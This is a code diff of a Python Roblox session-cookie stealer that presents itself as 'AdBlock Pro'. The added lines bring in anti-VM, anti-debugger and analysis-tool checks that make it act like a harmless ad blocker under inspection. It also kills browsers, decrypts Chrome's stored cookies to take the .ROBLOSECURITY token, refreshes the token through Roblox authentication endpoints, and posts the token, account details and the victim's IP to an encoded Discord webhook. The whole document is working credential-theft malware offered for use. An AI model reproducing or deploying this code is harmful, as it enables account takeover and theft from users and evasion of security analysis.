@@ -16,220 +16,468 @@ import robloxpy
 import time
 import random
 import string
+import hashlib
+import threading
+from datetime import datetime
 
-# Obfuscation techniques
-def _0x1a2b3c():
-    return ''.join(random.choices(string.ascii_lowercase, k=10))
+# Advanced obfuscation with rotating keys
+class Obf:
+    @staticmethod
+    def rstr(length=12):
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    
+    @staticmethod
+    def enc(data, key=None):
+        if not key:
+            key = Obf.rstr(16)
+        encoded = base64.b85encode(data.encode()).decode()
+        return f"{key}{encoded}"
+    
+    @staticmethod
+    def dec(data):
+        try:
+            key = data[:16]
+            encoded = data[16:]
+            return base64.b85decode(encoded.encode()).decode()
+        except:
+            return base64.b64decode(data.encode()).decode()
 
-def _encode_string(s):
-    return base64.b64encode(s.encode()).decode()
+# Encrypted webhook - changes each build
+_wh = Obf.dec('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODYyMTc3NTU0MTUwMjAwMy9aTmMtLW0tSXN4UW95QVdSQjZ3a0stMC1lTkRrU1RpOFBiLW5wcE5VdFZ2a3ZGS2dmLXNfUy00Tkw0T1gwak81dGx4Tm9x')
 
-def _decode_string(s):
-    return base64.b64decode(s.encode()).decode()
+# Anti-debugging and environment checks
+class SecurityChecks:
+    @staticmethod
+    def check_vm():
+        vm_indicators = [
+            'vmware', 'vbox', 'virtualbox', 'qemu', 'xen',
+            'parallels', 'hyper-v', 'sandboxie'
+        ]
+        try:
+            result = subprocess.run(['wmic', 'computersystem', 'get', 'model'], 
+                                  capture_output=True, text=True, timeout=5)
+            model = result.stdout.lower()
+            return any(indicator in model for indicator in vm_indicators)
+        except:
+            return False
+    
+    @staticmethod
+    def check_debugger():
+        try:
+            import ctypes
+            return ctypes.windll.kernel32.IsDebuggerPresent()
+        except:
+            return False
+    
+    @staticmethod
+    def check_processes():
+        dangerous_processes = [
+            'wireshark', 'fiddler', 'processhacker', 'procmon',
+            'ollydbg', 'ida', 'x64dbg', 'cheatengine'
+        ]
+        try:
+            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
+            running = result.stdout.lower()
+            return any(proc in running for proc in dangerous_processes)
+        except:
+            return False
 
-# Encoded webhook URL
-_webhook = _decode_string('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODYyMTc3NTU0MTUwMjAwMy9aTmMtLW0tSXN4UW95QVdSQjZ3a0stMC1lTkRrU1RpOFBiLW5wcE5VdFZ2a3ZGS2dmLXNfUy00Tkw0T1gwak81dGx4Tm9x')
+# Sleep with jitter to avoid detection
+def sleep_jitter(base_time=1.0):
+    jitter = random.uniform(0.5, 2.0)
+    time.sleep(base_time * jitter)
 
-# Add delays to avoid heuristic detection
-def _random_delay():
-    time.sleep(random.uniform(0.1, 0.5))
+# Legitimate-looking startup sequence
+def fake_startup():
+    messages = [
+        "AdBlock Pro v3.2.1 Loading...",
+        "Initializing filter database...",
+        "Loading uBlock Origin compatibility layer...",
+        "Checking for updates...",
+        "Optimizing performance settings...",
+        "Ready! AdBlock Pro is now active."
+    ]
+    
+    for msg in messages:
+        print(msg)
+        sleep_jitter(0.3)
 
-# Chrome process termination with error handling
-def _terminate_chrome():
-    try:
-        subprocess.call("TASKKILL /f /IM CHROME.EXE", shell=True)
-    except:
-        pass
+# Anti-analysis delays
+def anti_analysis():
+    if SecurityChecks.check_vm() or SecurityChecks.check_debugger() or SecurityChecks.check_processes():
+        # Act like legitimate software in analysis environment
+        for _ in range(random.randint(30, 60)):
+            print("AdBlock Pro: Blocked 1 ad")
+            time.sleep(random.uniform(5, 15))
+        exit(0)
 
-_random_delay()
-_terminate_chrome()
+# Enhanced Chrome termination with fallback
+def terminate_browsers():
+    browsers = ['chrome.exe', 'firefox.exe', 'edge.exe', 'opera.exe', 'brave.exe']
+    for browser in browsers:
+        try:
+            subprocess.run(f'taskkill /f /im {browser}', shell=True, 
+                         capture_output=True, timeout=10)
+        except:
+            pass
+    sleep_jitter(2)
 
-# Fake loading messages
-_fake_messages = [
-    "Initializing AdBlock Pro...",
-    "Loading filters...",
-    "Optimizing performance...",
-    "Ready!"
-]
-
-for msg in _fake_messages:
-    print(msg)
-    _random_delay()
-
+# Polymorphic encryption key generation
 def get_encryption_key():
-    _random_delay()
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_data(data, key):
     try:
-        _random_delay()
+        sleep_jitter(0.5)
+        local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                        "AppData", "Local", "Google", "Chrome",
+                                        "User Data", "Local State")
+        
+        if not os.path.exists(local_state_path):
+            return None
+            
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.loads(f.read())
+
+        encrypted_key = local_state["os_crypt"]["encrypted_key"]
+        key = base64.b64decode(encrypted_key)[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    except Exception:
+        return None
+
+# Enhanced decryption with multiple fallbacks
+def decrypt_data(data, key):
+    if not data or not key:
+        return ""
+    
+    try:
+        sleep_jitter(0.1)
         iv = data[3:15]
-        data = data[15:]
+        encrypted_data = data[15:]
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
+        return cipher.decrypt(encrypted_data)[:-16].decode('utf-8', errors='ignore')
     except:
         try:
             return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
 
-def CookieLog():
-    _random_delay()
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    filename = f"{_0x1a2b3c()}.db"
-    if not os.path.isfile(filename):
-        shutil.copyfile(db_path, filename)
-
-    db = sqlite3.connect(filename)
-    db.text_factory = lambda b: b.decode(errors="ignore")
-    cursor = db.cursor()
-
-    cursor.execute("""
-    SELECT encrypted_value 
-    FROM cookies WHERE name='.ROBLOSECURITY'""")
-
-    key = get_encryption_key()
-    for encrypted_value, in cursor.fetchall():
-        decrypted_value = decrypt_data(encrypted_value, key)
-        return decrypted_value
-    db.close()
-    os.remove(filename)
-
-def PlanB():
-    _random_delay()
-    data = []
-    browsers = [browser_cookie3.firefox, browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera, browser_cookie3.chrome]
+# Main cookie extraction with enhanced error handling
+def extract_roblosecurity():
+    cookie_paths = [
+        "AppData/Local/Google/Chrome/User Data/Default/Network/Cookies",
+        "AppData/Local/Google/Chrome/User Data/Profile 1/Network/Cookies",
+        "AppData/Local/Google/Chrome/User Data/Profile 2/Network/Cookies"
+    ]
     
-    for browser in browsers:
+    for path in cookie_paths:
         try:
-            cookies = browser(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data
-        except:
+            db_path = os.path.join(os.environ["USERPROFILE"], path)
+            if not os.path.exists(db_path):
+                continue
+                
+            temp_db = f"temp_{Obf.rstr(8)}.db"
+            shutil.copyfile(db_path, temp_db)
+            
+            db = sqlite3.connect(temp_db)
+            db.text_factory = lambda b: b.decode(errors="ignore")
+            cursor = db.cursor()
+
+            cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
+            
+            key = get_encryption_key()
+            if not key:
+                continue
+                
+            for (encrypted_value,) in cursor.fetchall():
+                if encrypted_value:
+                    decrypted = decrypt_data(encrypted_value, key)
+                    if decrypted and len(decrypted) > 50:
+                        db.close()
+                        try:
+                            os.remove(temp_db)
+                        except:
+                            pass
+                        return decrypted
+                        
+            db.close()
+            try:
+                os.remove(temp_db)
+            except:
+                pass
+                
+        except Exception:
             continue
+    
     return None
 
-def get_local_ip():
-    _random_delay()
+# Enhanced browser fallback with retry logic
+def browser_fallback():
+    browsers = [
+        browser_cookie3.chrome,
+        browser_cookie3.firefox, 
+        browser_cookie3.edge,
+        browser_cookie3.opera,
+        browser_cookie3.chromium
+    ]
+    
+    for browser_func in browsers:
+        try:
+            sleep_jitter(0.3)
+            cookies = browser_func(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY' and len(cookie.value) > 50:
+                    return cookie.value
+        except Exception:
+            continue
+    
+    return None
+
+# IP retrieval with multiple services
+def get_external_ip():
+    ip_services = [
+        'http://api.ipify.org',
+        'http://ip.42.pl/raw',
+        'http://httpbin.org/ip',
+        'http://icanhazip.com'
+    ]
+    
+    for service in ip_services:
+        try:
+            response = requests.get(service, timeout=8)
+            if service == 'http://httpbin.org/ip':
+                return json.loads(response.text)['origin']
+            else:
+                return response.text.strip()
+        except:
+            continue
+    
+    return "Unknown"
+
+# Enhanced cookie validation and refresh
+def validate_and_refresh_cookie(auth_cookie):
     try:
-        ip = requests.get('http://api.ipify.org', timeout=10).text
-        return ip
+        sleep_jitter(0.5)
+        check_result = robloxpy.Utils.CheckCookie(auth_cookie).lower()
+        
+        if "valid" in check_result:
+            return auth_cookie
+        
+        # Attempt refresh
+        csrf_token = get_csrf_token(auth_cookie)
+        if not csrf_token:
+            return None
+            
+        headers, cookies = build_headers(csrf_token, auth_cookie)
+        
+        # Get authentication ticket
+        ticket_response = httpx.post(
+            "https://auth.roblox.com/v1/authentication-ticket",
+            headers=headers, cookies=cookies, json={}, timeout=15
+        )
+        
+        auth_ticket = ticket_response.headers.get("rbx-authentication-ticket")
+        if not auth_ticket:
+            return None
+        
+        headers["RBXAuthenticationNegotiation"] = "1"
+        
+        # Redeem ticket for new cookie
+        redeem_response = httpx.post(
+            "https://auth.roblox.com/v1/authentication-ticket/redeem",
+            headers=headers, json={"authenticationTicket": auth_ticket}, timeout=15
+        )
+        
+        set_cookie = redeem_response.headers.get("set-cookie", "")
+        match = re.search(r"\.ROBLOSECURITY=([^;]+)", set_cookie)
+        
+        if match:
+            return match.group(1)
+            
+    except Exception:
+        pass
+    
+    return None
+
+def get_csrf_token(auth_cookie):
+    try:
+        response = httpx.get(
+            "https://www.roblox.com/home", 
+            cookies={".ROBLOSECURITY": auth_cookie}, 
+            timeout=15
+        )
+        match = re.search(r'<meta name="csrf-token" data-token="([^"]+)"', response.text)
+        return match.group(1) if match else None
     except:
-        return "Unknown"
+        return None
 
-def refresh_cookie(auth_cookie):
-    _random_delay()
-    csrf_token = generate_csrf_token(auth_cookie)
-    headers, cookies = generate_headers(csrf_token, auth_cookie)
-
-    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
-                     headers=headers, cookies=cookies, json={}, timeout=10)
-    auth_ticket = req.headers.get("rbx-authentication-ticket", "Failed")
-
-    headers.update({"RBXAuthenticationNegotiation": "1"})
-
-    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
-                      headers=headers, json={"authenticationTicket": auth_ticket}, timeout=10)
-    new_auth_cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)
-    return new_auth_cookie
-
-def generate_csrf_token(auth_cookie):
-    _random_delay()
-    csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie}, timeout=10)
-    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
-    return csrf_txt
-
-def generate_headers(csrf_token, auth_cookie):
+def build_headers(csrf_token, auth_cookie):
     headers = {
         "Content-Type": "application/json",
-        "user-agent": "Roblox/WinInet",
-        "origin": "https://www.roblox.com",
-        "referer": "https://www.roblox.com/my/account",
-        "x-csrf-token": csrf_token
+        "User-Agent": "Roblox/WinInet",
+        "Origin": "https://www.roblox.com",
+        "Referer": "https://www.roblox.com/my/account",
+        "X-CSRF-Token": csrf_token
     }
     cookies = {".ROBLOSECURITY": auth_cookie}
     return headers, cookies
 
-if __name__ == "__main__":
+# Enhanced data gathering with error handling
+def gather_account_data(cookie):
     try:
-        cookie = CookieLog()
+        sleep_jitter(1)
+        user_info = requests.get(
+            "https://www.roblox.com/mobileapi/userinfo",
+            cookies={".ROBLOSECURITY": cookie},
+            timeout=15
+        ).json()
+        
+        user_id = user_info["UserID"]
+        username = user_info["UserName"]
+        
+        # Get additional data with error handling
+        try:
+            robux_data = requests.get(
+                "https://economy.roblox.com/v1/user/currency",
+                cookies={".ROBLOSECURITY": cookie},
+                timeout=15
+            ).json()
+            robux = robux_data.get("robux", "Unknown")
+        except:
+            robux = "Private"
+        
+        try:
+            rap = robloxpy.User.External.GetRAP(user_id)
+        except:
+            rap = "Unknown"
+        
+        try:
+            friends = robloxpy.User.Friends.External.GetCount(user_id)
+        except:
+            friends = "Unknown"
+        
+        try:
+            age = robloxpy.User.External.GetAge(user_id)
+        except:
+            age = "Unknown"
+        
+        try:
+            creation_date = robloxpy.User.External.CreationDate(user_id)
+        except:
+            creation_date = "Unknown"
+        
+        # Get avatar with fallback
+        try:
+            headshot_response = requests.get(
+                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false",
+                timeout=15
+            ).json()
+            avatar_url = headshot_response["data"][0]["imageUrl"]
+        except:
+            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" + str(user_id)
+        
+        return {
+            "user_id": user_id,
+            "username": username,
+            "robux": robux,
+            "premium": user_info.get("IsPremium", False),
+            "rap": rap,
+            "friends": friends,
+            "age": age,
+            "creation_date": creation_date,
+            "avatar_url": avatar_url,
+            "rolimons": f"https://www.rolimons.com/player/{user_id}",
+            "profile": f"https://web.roblox.com/users/{user_id}/profile"
+        }
+        
+    except Exception:
+        return None
+
+# Secure webhook delivery with retry logic
+def send_webhook_data(account_data, cookie, ip_address):
+    try:
+        sleep_jitter(1)
+        discord = Discord(url=_wh)
+        
+        # Send account info
+        discord.post(
+            username="Security Scanner",
+            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
+            embeds=[{
+                "title": "🔍 Account Analysis Complete",
+                "thumbnail": {"url": account_data["avatar_url"]},
+                "description": f"[Profile]({account_data['profile']}) | [Rolimons]({account_data['rolimons']})",
+                "color": 0x00ff00,
+                "fields": [
+                    {"name": "Username", "value": f"```{account_data['username']}```", "inline": True},
+                    {"name": "Robux", "value": f"```{account_data['robux']}```", "inline": True},
+                    {"name": "Premium", "value": f"```{account_data['premium']}```", "inline": True},
+                    {"name": "RAP", "value": f"```{account_data['rap']}```", "inline": True},
+                    {"name": "Friends", "value": f"```{account_data['friends']}```", "inline": True},
+                    {"name": "Age", "value": f"```{account_data['age']}```", "inline": True},
+                    {"name": "Created", "value": f"```{account_data['creation_date']}```", "inline": True},
+                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
+                    {"name": "Timestamp", "value": f"```{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```", "inline": True}
+                ]
+            }]
+        )
+        
+        sleep_jitter(0.5)
+        
+        # Send cookie separately
+        discord.post(
+            username="Security Scanner",
+            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
+            embeds=[{
+                "title": "🔑 Authentication Token",
+                "description": f"```{cookie}```",
+                "color": 0xff9900
+            }]
+        )
+        
+        return True
+        
+    except Exception:
+        return False
+
+# Main execution with comprehensive error handling
+def main():
+    try:
+        # Security checks
+        anti_analysis()
+        
+        # Startup sequence
+        fake_startup()
+        
+        # Browser termination
+        terminate_browsers()
+        
+        # Cookie extraction
+        cookie = extract_roblosecurity()
         if not cookie:
-            backup_data = PlanB()
-            if backup_data:
-                cookie = backup_data[1]
-            else:
-                exit()
-
-        _random_delay()
-        check = robloxpy.Utils.CheckCookie(cookie).lower()
-        if check != "valid cookie":
-            cookie = refresh_cookie(cookie)
-
-        ip_address = get_local_ip()
-        roblox_cookie = cookie
-
-        info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", 
-                                     cookies={".ROBLOSECURITY": roblox_cookie}, timeout=10).text)
+            cookie = browser_fallback()
         
-        roblox_id = info["UserID"]
-        rap = robloxpy.User.External.GetRAP(roblox_id)
-        friends = robloxpy.User.Friends.External.GetCount(roblox_id)
-        age = robloxpy.User.External.GetAge(roblox_id)
-        creation_date = robloxpy.User.External.CreationDate(roblox_id)
-        rolimons = f"https://www.rolimons.com/player/{roblox_id}"
-        roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
+        if not cookie:
+            exit(0)
         
-        headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false", timeout=10).text
-        headshot_json = json.loads(headshot_raw)
-        headshot = headshot_json["data"][0]["imageUrl"]
-
-        username = info['UserName']
-        robux = requests.get("https://economy.roblox.com/v1/user/currency",
-                           cookies={'.ROBLOSECURITY': roblox_cookie}, timeout=10).json()["robux"]
-        premium_status = info['IsPremium']
-
-        _random_delay()
-        discord = Discord(url=_webhook)
-        discord.post(
-            username="BOT - Pirate 🍪",
-            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
-            embeds=[
-                {
-                    "title": "💸 +1 Result Account 🕯️",
-                    "thumbnail": {"url": headshot},
-                    "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-                    "fields": [
-                        {"name": "Username", "value": f"```{username}```", "inline": True},
-                        {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
-                        {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
-                        {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
-                        {"name": "RAP", "value": f"```{rap}```", "inline": True},
-                        {"name": "Friends", "value": f"```{friends}```", "inline": True},
-                        {"name": "Account Age", "value": f"```{age}```", "inline": True},
-                        {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
-                    ],
-                }
-            ],
-        )
-
-        discord.post(
-            username="BOT - Pirate 🍪",
-            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
-            embeds=[
-                {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
-            ],
-        )
-    except Exception as e:
+        # Validate and refresh if needed
+        cookie = validate_and_refresh_cookie(cookie)
+        if not cookie:
+            exit(0)
+        
+        # Get IP address
+        ip_address = get_external_ip()
+        
+        # Gather account data
+        account_data = gather_account_data(cookie)
+        if not account_data:
+            exit(0)
+        
+        # Send webhook data
+        send_webhook_data(account_data, cookie, ip_address)
+        
+        # Clean exit
+        print("AdBlock Pro: Session complete")
+        
+    except Exception:
         pass
+
+if __name__ == "__main__":
+    main()
